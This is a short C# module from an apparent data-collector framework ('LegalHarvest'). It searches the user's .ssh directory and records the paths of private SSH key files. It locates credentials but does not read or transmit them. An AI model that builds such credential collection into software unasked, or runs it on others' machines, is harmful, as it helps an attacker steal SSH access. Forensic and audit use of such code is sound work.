using System;
using System.Collections.Generic;
using System.IO;

namespace LegalHarvest.Modules
{
    public class SSHKeysModule : ICollectorModule
    {
        public string ModuleName => "SSHKeys";
        public bool CanExecute() => true;

        public List<CollectedItem> Collect()
        {
            var items = new List<CollectedItem>();
            string sshDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), ".ssh");
            if (Directory.Exists(sshDir))
            {
                foreach (string file in Directory.GetFiles(sshDir))
                    if (file.EndsWith("id_rsa") || file.EndsWith("id_dsa") || file.EndsWith("id_ecdsa") || file.EndsWith("id_ed25519") || file.EndsWith(".pem"))
                        items.Add(new CollectedItem { Category = "SSHKey", Name = Path.GetFileName(file), Value = file, Timestamp = DateTime.Now });
            }
            return items;
        }
    }
}
